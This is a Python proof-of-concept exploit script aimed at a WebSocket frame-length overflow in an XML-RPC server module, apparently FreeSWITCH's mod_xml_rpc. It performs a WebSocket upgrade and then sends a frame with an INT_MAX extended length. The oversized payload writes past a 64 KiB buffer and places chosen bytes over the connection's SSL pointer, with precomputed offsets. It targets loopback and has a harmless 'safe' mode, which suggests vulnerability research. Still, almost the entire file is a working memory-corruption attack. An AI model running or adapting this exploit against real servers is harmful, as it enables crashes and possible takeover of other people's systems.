#!/usr/bin/env python3
"""Loopback-only client for the mod_xml_rpc WebSocket extended-length frame.

Sends a valid /socket upgrade, then one text frame whose 8-byte extended
length decodes (via ntohl on the low word) to INT_MAX. The signed guard's
addition overflows negative, so ws_raw_read copies the sender's payload
byte-faithfully past the 64 KiB buffer into the trailing wsh_t fields.
"""
import socket
import struct
import sys

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 18080
MODE = sys.argv[2] if len(sys.argv) > 2 else "exploit"
TARGET = bytes.fromhex("4142434445464748")  # chosen 8 bytes for wsh->ssl
# No mask: 0x81 FIN+TEXT, 0x7F extended-127. Server's 14-byte header read
# consumes payload[0..3], then copies payload[4..] to wsh->buffer+10.
# wsh->ssl is buffer-relative 131104, so frame payload index is 131094.
SSL_OFFSET = 131094
PAYLOAD_LEN = 131102  # last written byte is wsh->ssl's final byte; stop before handshake

if MODE == "safe":
    header = bytes([0x81, 0x04])  # 4-byte text frame, no extended length
    payload = bytearray(b"ping")
else:
    # 0x81 = FIN + TEXT, 0x7F = extended 127 length, no mask bit
    header = bytes([0x81, 0x7F]) + bytes.fromhex("7fffffff00000000")
    payload = bytearray(b"A" * PAYLOAD_LEN)
    payload[SSL_OFFSET:SSL_OFFSET + 8] = TARGET

s = socket.create_connection((HOST, PORT), timeout=5)
req = (
    "GET /socket HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    "Sec-WebSocket-Protocol: websocket\r\n"
    "\r\n"
)
s.sendall(req.encode())
resp = b""
while b"\r\n\r\n" not in resp:
    chunk = s.recv(4096)
    if not chunk:
        break
    resp += chunk
print("UPGRADE_RESPONSE=", resp.split(b"\r\n", 1)[0].decode(errors="replace"), flush=True)
print("UPGRADE_101=", b"101" in resp.split(b"\r\n", 1)[0], flush=True)
s.sendall(header + payload)
print("SENT_FRAME=", len(header) + len(payload), "ssl_index=", SSL_OFFSET,
      "chosen=", TARGET.hex(), flush=True)
try:
    s.shutdown(socket.SHUT_WR)
except OSError:
    pass
s.settimeout(3)
try:
    tail = s.recv(256)
    print("TAIL=", tail[:120].hex(), flush=True)
except Exception as exc:
    print("TAIL_EXC=", type(exc).__name__, str(exc), flush=True)
s.close()
